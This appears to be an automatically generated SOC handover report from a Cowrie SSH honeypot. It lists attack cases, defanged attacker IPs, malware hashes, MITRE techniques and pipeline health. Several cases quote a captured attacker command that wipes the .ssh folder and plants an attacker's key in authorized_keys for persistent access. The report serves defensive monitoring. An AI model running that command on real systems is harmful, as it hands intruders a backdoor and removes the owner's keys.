
| Time (UTC) | Event |
|---|---|
| `2026-04-23 15:33:08` | `cowrie.session.connect` |
| `2026-04-23 15:33:08` | `cowrie.client.version` |
| `2026-04-23 15:33:08` | `cowrie.client.kex` |
| `2026-04-23 15:33:09` | `cowrie.login.success` |
| `2026-04-23 15:33:09` | `cowrie.session.params` |
| `2026-04-23 15:33:09` | `cowrie.command.input` |
| `2026-04-23 15:33:09` | `cowrie.command.failed` |
| `2026-04-23 15:33:09` | `cowrie.log.closed` |
| `2026-04-23 15:33:10` | `cowrie.session.params` |
| `2026-04-23 15:33:10` | `cowrie.command.input` |
| `2026-04-23 15:33:11` | `cowrie.session.file_download` |
| `2026-04-23 15:33:11` | `cowrie.log.closed` |
| `2026-04-23 15:33:24` | `cowrie.session.params` |
| `2026-04-23 15:33:24` | `cowrie.command.input` |
| `2026-04-23 15:33:25` | `cowrie.log.closed` |
| `2026-04-23 15:33:25` | `cowrie.session.params` |
| `2026-04-23 15:33:25` | `cowrie.command.input` |
| `2026-04-23 15:33:25` | `cowrie.log.closed` |
| `2026-04-23 15:33:26` | `cowrie.session.params` |
| `2026-04-23 15:33:26` | `cowrie.command.input` |
| `2026-04-23 15:33:26` | `cowrie.session.file_download` |
| `2026-04-23 15:33:26` | `cowrie.log.closed` |
| `2026-04-23 15:33:26` | `cowrie.session.params` |
| `2026-04-23 15:33:26` | `cowrie.command.input` |
| `2026-04-23 15:33:26` | `cowrie.log.closed` |
| `2026-04-23 15:33:27` | `cowrie.session.params` |
| `2026-04-23 15:33:27` | `cowrie.command.input` |
| `2026-04-23 15:33:27` | `cowrie.log.closed` |
| `2026-04-23 15:33:27` | `cowrie.session.params` |
| `2026-04-23 15:33:27` | `cowrie.command.input` |
| `2026-04-23 15:33:27` | `cowrie.command.input` |
| `2026-04-23 15:33:27` | `cowrie.log.closed` |
| `2026-04-23 15:33:28` | `cowrie.session.params` |
| `2026-04-23 15:33:28` | `cowrie.command.input` |
| `2026-04-23 15:33:28` | `cowrie.log.closed` |
| `2026-04-23 15:33:28` | `cowrie.session.params` |
| `2026-04-23 15:33:28` | `cowrie.command.input` |
| `2026-04-23 15:33:28` | `cowrie.log.closed` |
| `2026-04-23 15:33:28` | `cowrie.session.params` |
| `2026-04-23 15:33:28` | `cowrie.command.input` |
| `2026-04-23 15:33:29` | `cowrie.log.closed` |
| `2026-04-23 15:33:29` | `cowrie.session.params` |
| `2026-04-23 15:33:29` | `cowrie.command.input` |
| `2026-04-23 15:33:29` | `cowrie.log.closed` |
| `2026-04-23 15:33:29` | `cowrie.session.params` |
| `2026-04-23 15:33:29` | `cowrie.command.input` |
| `2026-04-23 15:33:29` | `cowrie.log.closed` |
| `2026-04-23 15:33:30` | `cowrie.session.params` |
| `2026-04-23 15:33:30` | `cowrie.command.input` |
| `2026-04-23 15:33:30` | `cowrie.log.closed` |
| `2026-04-23 15:33:30` | `cowrie.session.params` |
| `2026-04-23 15:33:30` | `cowrie.command.input` |
| `2026-04-23 15:33:30` | `cowrie.log.closed` |
| `2026-04-23 15:33:31` | `cowrie.session.params` |
| `2026-04-23 15:33:31` | `cowrie.command.input` |
| `2026-04-23 15:33:31` | `cowrie.log.closed` |
| `2026-04-23 15:33:31` | `cowrie.session.params` |
| `2026-04-23 15:33:31` | `cowrie.command.input` |
| `2026-04-23 15:33:31` | `cowrie.log.closed` |
| `2026-04-23 15:33:32` | `cowrie.session.params` |
| `2026-04-23 15:33:32` | `cowrie.command.input` |
| `2026-04-23 15:33:32` | `cowrie.log.closed` |
| `2026-04-23 15:33:32` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `14.103.105[.]254` to AbuseIPDB if not already reported
- [ ] Block `14.103.105[.]254` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-eea8ce102ea7

| Field | Detail |
|---|---|
| **Source IP** | `177.91.180[.]81` |
| **First Seen** | 2026-04-23 15:34 |
| **Last Seen** | 2026-04-23 15:34 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-23 15:34:19` | `cowrie.session.connect` |
| `2026-04-23 15:34:19` | `cowrie.client.version` |
| `2026-04-23 15:34:19` | `cowrie.client.kex` |
| `2026-04-23 15:34:21` | `cowrie.login.success` |
| `2026-04-23 15:34:21` | `cowrie.session.params` |
| `2026-04-23 15:34:21` | `cowrie.command.input` |
| `2026-04-23 15:34:21` | `cowrie.command.failed` |
| `2026-04-23 15:34:22` | `cowrie.log.closed` |
| `2026-04-23 15:34:22` | `cowrie.session.params` |
| `2026-04-23 15:34:22` | `cowrie.command.input` |
| `2026-04-23 15:34:23` | `cowrie.session.file_download` |
| `2026-04-23 15:34:23` | `cowrie.log.closed` |
| `2026-04-23 15:34:28` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `177.91.180[.]81` to AbuseIPDB if not already reported
- [ ] Block `177.91.180[.]81` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-49641882f7e0

| Field | Detail |
|---|---|
| **Source IP** | `177.91.180[.]81` |
| **First Seen** | 2026-04-23 15:34 |
| **Last Seen** | 2026-04-23 15:34 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-23 15:34:26` | `cowrie.session.connect` |
| `2026-04-23 15:34:26` | `cowrie.client.version` |
| `2026-04-23 15:34:27` | `cowrie.client.kex` |
| `2026-04-23 15:34:28` | `cowrie.login.success` |
| `2026-04-23 15:34:28` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `177.91.180[.]81` to AbuseIPDB if not already reported
- [ ] Block `177.91.180[.]81` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b3bb7991af99

| Field | Detail |
|---|---|
| **Source IP** | `177.91.180[.]81` |
| **First Seen** | 2026-04-23 15:38 |
| **Last Seen** | 2026-04-23 15:38 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-23 15:38:39` | `cowrie.session.connect` |
| `2026-04-23 15:38:39` | `cowrie.client.version` |
| `2026-04-23 15:38:39` | `cowrie.client.kex` |
| `2026-04-23 15:38:40` | `cowrie.login.success` |
| `2026-04-23 15:38:41` | `cowrie.session.params` |
| `2026-04-23 15:38:41` | `cowrie.command.input` |
| `2026-04-23 15:38:41` | `cowrie.command.failed` |
| `2026-04-23 15:38:41` | `cowrie.log.closed` |
| `2026-04-23 15:38:42` | `cowrie.session.params` |
| `2026-04-23 15:38:42` | `cowrie.command.input` |
| `2026-04-23 15:38:42` | `cowrie.session.file_download` |
| `2026-04-23 15:38:42` | `cowrie.log.closed` |
| `2026-04-23 15:38:48` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `177.91.180[.]81` to AbuseIPDB if not already reported
- [ ] Block `177.91.180[.]81` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-bb020dfb1f4e

| Field | Detail |
|---|---|
| **Source IP** | `177.91.180[.]81` |
| **First Seen** | 2026-04-23 15:38 |
| **Last Seen** | 2026-04-23 15:38 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-23 15:38:46` | `cowrie.session.connect` |
| `2026-04-23 15:38:46` | `cowrie.client.version` |
| `2026-04-23 15:38:46` | `cowrie.client.kex` |
| `2026-04-23 15:38:48` | `cowrie.login.success` |
| `2026-04-23 15:38:48` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `177.91.180[.]81` to AbuseIPDB if not already reported
- [ ] Block `177.91.180[.]81` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b9fd33498c19

| Field | Detail |
|---|---|
| **Source IP** | `177.91.180[.]81` |
| **First Seen** | 2026-04-23 15:39 |
| **Last Seen** | 2026-04-23 15:39 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-23 15:39:43` | `cowrie.session.connect` |
| `2026-04-23 15:39:43` | `cowrie.client.version` |
| `2026-04-23 15:39:44` | `cowrie.client.kex` |
| `2026-04-23 15:39:45` | `cowrie.login.success` |
| `2026-04-23 15:39:46` | `cowrie.session.params` |
| `2026-04-23 15:39:46` | `cowrie.command.input` |
| `2026-04-23 15:39:46` | `cowrie.command.failed` |
| `2026-04-23 15:39:46` | `cowrie.log.closed` |
| `2026-04-23 15:39:47` | `cowrie.session.params` |
| `2026-04-23 15:39:47` | `cowrie.command.input` |
| `2026-04-23 15:39:47` | `cowrie.session.file_download` |
| `2026-04-23 15:39:47` | `cowrie.log.closed` |
| `2026-04-23 15:39:52` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `177.91.180[.]81` to AbuseIPDB if not already reported
- [ ] Block `177.91.180[.]81` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0f8354930794

| Field | Detail |
|---|---|
| **Source IP** | `177.91.180[.]81` |
| **First Seen** | 2026-04-23 15:39 |
| **Last Seen** | 2026-04-23 15:39 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-23 15:39:50` | `cowrie.session.connect` |
| `2026-04-23 15:39:50` | `cowrie.client.version` |
| `2026-04-23 15:39:51` | `cowrie.client.kex` |
| `2026-04-23 15:39:52` | `cowrie.login.success` |
| `2026-04-23 15:39:52` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `177.91.180[.]81` to AbuseIPDB if not already reported
- [ ] Block `177.91.180[.]81` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

---

## 📡 Reconnaissance Activity — Grouped by Source IP

> Repeated connect/close sessions with no auth success, commands, or downloads.
> Grouped within a 120-minute window per IP to reduce noise.

| IP | Sessions | First Seen | Last Seen | Duration | Login Attempts | TTPs | Severity |
|---|---|---|---|---|---|---|---|
| `177.91.180[.]81` | **26** | 2026-04-23 15:10 | 2026-04-23 15:39 | 0m | 26 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `14.103.105[.]254` | **11** | 2026-04-23 15:07 | 2026-04-23 15:38 | 18m | 2 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `121.122.65[.]136` | **5** | 2026-04-23 13:53 | 2026-04-23 13:57 | 0m | 5 | `T1110.001 · T1592` | 🟢 LOW |
| `112.30.72[.]108` | 1 | 2026-04-23 15:14 | 2026-04-23 15:14 | 0s | 0 | `T1592` | 🟢 LOW |
| `113.59.150[.]123` | 1 | 2026-04-23 14:02 | 2026-04-23 14:03 | 30s | 0 | `T1592` | 🟢 LOW |

---

## 🦠 Malware Analysis Results (23 sample(s))

| File | Type | SHA-256 (short) | Threat Score | Severity | VT Detections |
|---|---|---|---|---|---|
| `01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b` | Unknown binary | `01ba4719c80b6fe9...` | 0/100 | 🟢 LOW | 0/76 ✅ |
| `12de77bef9500e41c76a2200bc6fa712e7e3fc188dfdd92a764a22c3421b7208` | ELF Binary (Linux executable) (x86-64 64-bit) | `12de77bef9500e41...` | 44/100 | 🟡 MEDIUM | **36/76** 🔴 |
| `17b7944a9b8a4e3edb1b1f2e743ae5d06dae0a8c3a9531e94970aa3261c2cab5` | ELF Binary (Linux executable) (x86-64 64-bit) | `17b7944a9b8a4e3e...` | 45/100 | 🟡 MEDIUM | **38/76** 🔴 |
| `38ef0580d99fb1524c13f8dc4981fe2757deb290b29f947ebc24b4b359756f63` | ELF Binary (Linux executable) (x86-64 64-bit) | `38ef0580d99fb152...` | 44/100 | 🟡 MEDIUM | **36/76** 🔴 |
| `72ce5b00ca4bfa0c18fcdf03a15e5391a85d81300783626598fe7e022e0ec538` | ELF Binary (Linux executable) (x86-64 64-bit) | `72ce5b00ca4bfa0c...` | 44/100 | 🟡 MEDIUM | **36/76** 🔴 |
| `776c0fccae481c384f5636903ce500fae22803cf8778ec9a029956bb85a68010` | ELF Binary (Linux executable) (x86-64 64-bit) | `776c0fccae481c38...` | 43/100 | 🟡 MEDIUM | **34/76** 🔴 |
| `77c2e7968f7695c1bfbe08f0c455cc95479a74cc7fdb432667e29bab08515ce1` | ELF Binary (Linux executable) (ARM 32-bit) | `77c2e7968f7695c1...` | 30/100 | 🟢 LOW | Not in VT |
| `7a9da7d10aa80b0f9e2e3f9e518030c86026a636e0b6de35905e15dd4c8e3e2d` | ELF Binary (Linux executable) (x86-64 64-bit) | `7a9da7d10aa80b0f...` | 45/100 | 🟡 MEDIUM | **39/76** 🔴 |
| `8daf92f0870c58ece8b68a3057c3ab6e8477215f853c54cdfe790acf1141161d` | ELF Binary (Linux executable) (ARM 32-bit) | `8daf92f0870c58ec...` | 43/100 | 🟡 MEDIUM | **33/76** 🔴 |
| `98babd858ec296d43844c96d53ff8713c44a451ba6e05b89d64c772828a0514d` | ELF Binary (Linux executable) (x86-64 64-bit) | `98babd858ec296d4...` | 44/100 | 🟡 MEDIUM | **37/76** 🔴 |
| `9a45029b646e2d20015695b5541f5fb76eace740bf329dc05af8ea53bd89619c` | Unknown binary | `9a45029b646e2d20...` | 0/100 | 🟢 LOW | 0/76 ✅ |
| `a04ac6d98ad989312783d4fe3456c53730b212c79a426fb215708b6c6daa3de3` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 49/100 | 🟡 MEDIUM | **50/76** 🔴 |
| `a2812d2ca38cf4e519e386901fb89c393d891417a168a278bbb9b9d4f38145cc` | ELF Binary (Linux executable) (x86-64 64-bit) | `a2812d2ca38cf4e5...` | 43/100 | 🟡 MEDIUM | **34/76** 🔴 |
| `a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2` | Unknown binary | `a8460f446be54041...` | 11/100 | 🟢 LOW | **30/76** 🔴 |
| `db2b1183a337cdf116ec3158067f70502e4534b6c27dd3a984c0bacb030732d5` | ELF Binary (Linux executable) (x86-64 64-bit) | `db2b1183a337cdf1...` | 42/100 | 🟡 MEDIUM | **31/75** 🔴 |
| `e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `e99df510c24950e447f6a471be7fb1b1f7716b0e882005db3511327cbc27b9ff` | ELF Binary (Linux executable) (ARM 32-bit) | `e99df510c24950e4...` | 30/100 | 🟢 LOW | 0/72 ✅ |
| `f200744b6900aeb0a27df08c71fc28a7f07b0aee21e844beca214eb8c4ab58dd` | ELF Binary (Linux executable) (x86-64 64-bit) | `f200744b6900aeb0...` | 43/100 | 🟡 MEDIUM | **34/76** 🔴 |
| `tmp3v3avwej` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `tmp41sthfqu` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 49/100 | 🟡 MEDIUM | **50/76** 🔴 |
| `tmpjyzmzmsu` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 49/100 | 🟡 MEDIUM | **50/76** 🔴 |
| `tmpw4ocpnlc` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 49/100 | 🟡 MEDIUM | **50/76** 🔴 |
| `tmpzmvvpi6d` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 49/100 | 🟡 MEDIUM | **50/76** 🔴 |

---

## 🌐 Top Attacker IPs by Abuse Score

| IP | Country | ISP | Abuse Score | OTX Pulses |
|---|---|---|---|---|
| `112.30.72[.]108` | CN | China Mobile Communications Corporation | **100** ⚠️ | 7 |
| `113.59.150[.]123` | KR | kt HCN Co.,Ltd. | **100** ⚠️ | 44 |
| `121.122.65[.]136` | MY | Maxis Broadband Sdn Bhd | **100** ⚠️ | 3 |
| `14.103.105[.]254` | CN | Beijing Volcano Engine Technology Co., Ltd. | **100** ⚠️ | 50 |
| `177.91.180[.]81` | BR | Voluy Telecom Eireli | **100** ⚠️ | 2 |
| `43.100.61[.]6` | HK | Alibaba Cloud (Singapore) Private Limited | **53** | 5 |
| `119.152.229[.]125` | PK | Pakistan Telecommunication Company Limited | **31** | 0 |
| `112.94.77[.]108` | CN | United-Communications-Network-Technology-Co-Ltd, GuangZhou | 3 | 0 |
| `40.76.106[.]75` | US | Microsoft Corporation | 1 | 0 |

---

## 🎯 Top TTPs Observed (MITRE ATT&CK)

| TTP ID | Count |
|---|---|
| [T1592](https://attack.mitre.org/techniques/T1592) | 100 |
| [T1110.001](https://attack.mitre.org/techniques/T1110/001) | 59 |
| [T1078](https://attack.mitre.org/techniques/T1078) | 33 |
| [T1021.004](https://attack.mitre.org/techniques/T1021/004) | 17 |
| [T1105](https://attack.mitre.org/techniques/T1105) | 17 |

---

## 🔕 False Positive Summary (31 filtered)

| Reason | Count |
|---|---|
| AbuseIPDB score 0 below threshold 25 | 1 |
| AbuseIPDB score 1 below threshold 25 | 1 |
| AbuseIPDB score 3 below threshold 25 | 3 |
| Mass-scanner pattern: no commands, no downloads, ≤2 login attempts | 26 |

> FP threshold: AbuseIPDB score < 25. Known scanner ISPs auto-filtered.

---

## ⚙️ Pipeline Health

| Tool | Role | Status |
|---|---|---|
| Tool 05  | Network Monitor (port 2222) | ✅ HEALTHY |
| Tool 26  | Incident Timeline Generator | ✅ 108 cases |
| Tool 34  | Credential Extractor        | ✅ 92 attempts |
| Tool 35  | SSH Fingerprint Aggregator  | ✅ 4 fingerprints |
| Tool 36  | Command Clustering          | ✅ 3 clusters |
| Tool 27  | Threat Intel Feeder         | ✅ 10 IPs enriched |
| Tool 29  | False Positive Tracker      | ✅ 31 filtered (28.7%) |
| Tool 30  | Metric Exporter             | ✅ stats.json written |
| Tool 30b | ASN Clustering              | ✅ 10 ASNs |
| Tool 31  | Malware Analyzer            | ✅ 23 files |
| Tool 33  | YARA Classifier             | ✅ 8 classified |
| Tool 28  | SOC Handover Report         | ✅ This report (v2.2) |

> **Report grouping:** 33 priority case(s) shown individually · 5 recon entry/entries in table (3 group(s) consolidating 42 session(s)).

---

## 📋 Standing Orders for Next Shift

- [ ] Verify honeypot is HEALTHY (Tool 05 green)
- [ ] Review any new HIGH/CRITICAL priority cases above
- [ ] Check AbuseIPDB for newly reported IPs from this shift
- [ ] If Cowrie captures a download, verify Tool 31 ran and check malware section
- [ ] Integrity baseline auto-recreates every 2 hours via pipeline

---

_Generated by THIR · Tool 28 v2.3 · SOC Handover Report Generator_  
_Pipeline: `nikhilsalunkemumbai/thir-live` · Cowrie SSH Honeypot · AWS EC2_  
_Report time: 2026-04-23T15:58:54Z_
